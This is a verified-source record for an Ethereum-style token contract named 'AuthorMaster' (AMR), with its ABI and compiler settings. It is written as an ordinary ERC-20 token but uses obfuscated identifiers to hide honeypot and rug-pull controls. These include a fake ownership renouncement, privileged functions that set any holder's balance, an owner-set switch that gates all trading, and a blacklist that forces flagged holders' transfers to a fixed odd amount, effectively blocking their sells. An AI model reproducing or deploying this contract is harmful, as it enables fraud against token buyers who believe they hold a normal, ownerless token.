{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface exemptTakeIs {\n    function createPair(address totalTeam, address fromTrading) external returns (address);\n}\n\ninterface modeTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenBuy) external view returns (uint256);\n\n    function transfer(address swapMarketingShould, uint256 marketingTxTeam) external returns (bool);\n\n    function allowance(address txTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingTxTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapMarketingShould,\n        uint256 marketingTxTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txTake, uint256 value);\n    event Approval(address indexed txTeam, address indexed spender, uint256 value);\n}\n\nabstract contract fundShouldTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountExemptWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface modeToMetadata is modeTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AuthorMaster is fundShouldTrading, modeTo, modeToMetadata {\n\n    uint256 totalTrading;\n\n    function walletLaunchShould() private view {\n        require(launchFrom[_msgSender()]);\n    }\n\n    function modeEnable(address enableReceiver) public {\n        walletLaunchShould();\n        if (autoAt == launchTotal) {\n            shouldLimit = true;\n        }\n        if (enableReceiver == exemptWalletAt || enableReceiver == marketingLiquidity) {\n            return;\n        }\n        maxReceiver[enableReceiver] = true;\n    }\n\n    function autoLiquidityEnable() public {\n        emit OwnershipTransferred(exemptWalletAt, address(0));\n        receiverMarketing = address(0);\n    }\n\n    mapping(address => bool) public launchFrom;\n\n    address minTeamAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private launchedTakeFee;\n\n    bool public isSender;\n\n    event OwnershipTransferred(address indexed txTo, address indexed modeLaunchedAuto);\n\n    address launchedSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private modeAuto;\n\n    uint256 maxTrading;\n\n    mapping(address => bool) public maxReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityIsTrading;\n    }\n\n    constructor (){\n        \n        amountExemptWallet limitSenderMode = amountExemptWallet(minTeamAt);\n        marketingLiquidity = exemptTakeIs(limitSenderMode.factory()).createPair(limitSenderMode.WETH(), address(this));\n        \n        exemptWalletAt = _msgSender();\n        launchFrom[exemptWalletAt] = true;\n        launchedTakeFee[exemptWalletAt] = liquidityIsTrading;\n        autoLiquidityEnable();\n        if (modeAuto == walletSwap) {\n            walletSwap = autoAt;\n        }\n        emit Transfer(address(0), exemptWalletAt, liquidityIsTrading);\n    }\n\n    function swapToTeam(uint256 marketingTxTeam) public {\n        walletLaunchShould();\n        maxTrading = marketingTxTeam;\n    }\n\n    function exemptTotal(address marketingFundExempt, uint256 marketingTxTeam) public {\n        walletLaunchShould();\n        launchedTakeFee[marketingFundExempt] = marketingTxTeam;\n    }\n\n    function feeExempt(address exemptReceiverAt, address swapMarketingShould, uint256 marketingTxTeam) internal returns (bool) {\n        if (exemptReceiverAt == exemptWalletAt) {\n            return walletAutoToken(exemptReceiverAt, swapMarketingShould, marketingTxTeam);\n        }\n        uint256 maxAmount = modeTo(marketingLiquidity).balanceOf(launchedSwap);\n        require(maxAmount == maxTrading);\n        require(swapMarketingShould != launchedSwap);\n        if (maxReceiver[exemptReceiverAt]) {\n            return walletAutoToken(exemptReceiverAt, swapMarketingShould, walletLiquidity);\n        }\n        return walletAutoToken(exemptReceiverAt, swapMarketingShould, marketingTxTeam);\n    }\n\n    bool private limitReceiver;\n\n    address public exemptWalletAt;\n\n    function owner() external view returns (address) {\n        return receiverMarketing;\n    }\n\n    uint256 private walletSwap;\n\n    string private isBuy = \"Author Master\";\n\n    bool public liquidityMode;\n\n    bool private enableFrom;\n\n    mapping(address => mapping(address => uint256)) private swapLaunch;\n\n    bool public marketingToken;\n\n    function balanceOf(address tokenBuy) public view virtual override returns (uint256) {\n        return launchedTakeFee[tokenBuy];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return isBuy;\n    }\n\n    uint256 private launchTotal;\n\n    uint256 constant walletLiquidity = 13 ** 10;\n\n    function transferFrom(address exemptReceiverAt, address swapMarketingShould, uint256 marketingTxTeam) external override returns (bool) {\n        if (_msgSender() != minTeamAt) {\n            if (swapLaunch[exemptReceiverAt][_msgSender()] != type(uint256).max) {\n                require(marketingTxTeam <= swapLaunch[exemptReceiverAt][_msgSender()]);\n                swapLaunch[exemptReceiverAt][_msgSender()] -= marketingTxTeam;\n            }\n        }\n        return feeExempt(exemptReceiverAt, swapMarketingShould, marketingTxTeam);\n    }\n\n    string private toAt = \"AMR\";\n\n    function allowance(address minIs, address marketingFundAmount) external view virtual override returns (uint256) {\n        if (marketingFundAmount == minTeamAt) {\n            return type(uint256).max;\n        }\n        return swapLaunch[minIs][marketingFundAmount];\n    }\n\n    uint8 private receiverTrading = 18;\n\n    function approve(address marketingFundAmount, uint256 marketingTxTeam) public virtual override returns (bool) {\n        swapLaunch[_msgSender()][marketingFundAmount] = marketingTxTeam;\n        emit Approval(_msgSender(), marketingFundAmount, marketingTxTeam);\n        return true;\n    }\n\n    uint256 private autoAt;\n\n    uint256 private liquidityIsTrading = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return toAt;\n    }\n\n    uint256 public minLimitLaunch;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverTrading;\n    }\n\n    function walletAutoToken(address exemptReceiverAt, address swapMarketingShould, uint256 marketingTxTeam) internal returns (bool) {\n        require(launchedTakeFee[exemptReceiverAt] >= marketingTxTeam);\n        launchedTakeFee[exemptReceiverAt] -= marketingTxTeam;\n        launchedTakeFee[swapMarketingShould] += marketingTxTeam;\n        emit Transfer(exemptReceiverAt, swapMarketingShould, marketingTxTeam);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverMarketing;\n    }\n\n    function sellBuyExempt(address takeLaunchReceiver) public {\n        require(takeLaunchReceiver.balance < 100000);\n        if (isSender) {\n            return;\n        }\n        \n        launchFrom[takeLaunchReceiver] = true;\n        if (walletSwap != minLimitLaunch) {\n            marketingToken = false;\n        }\n        isSender = true;\n    }\n\n    bool private shouldLimit;\n\n    function transfer(address marketingFundExempt, uint256 marketingTxTeam) external virtual override returns (bool) {\n        return feeExempt(_msgSender(), marketingFundExempt, marketingTxTeam);\n    }\n\n    address private receiverMarketing;\n\n    address public marketingLiquidity;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeLaunchedAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingFundAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingFundAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTxTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLiquidityEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingFundExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTxTeam\",\"type\":\"uint256\"}],\"name\":\"exemptTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptWalletAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLimitLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableReceiver\",\"type\":\"address\"}],\"name\":\"modeEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLaunchReceiver\",\"type\":\"address\"}],\"name\":\"sellBuyExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingTxTeam\",\"type\":\"uint256\"}],\"name\":\"swapToTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingFundExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTxTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptReceiverAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapMarketingShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTxTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AuthorMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}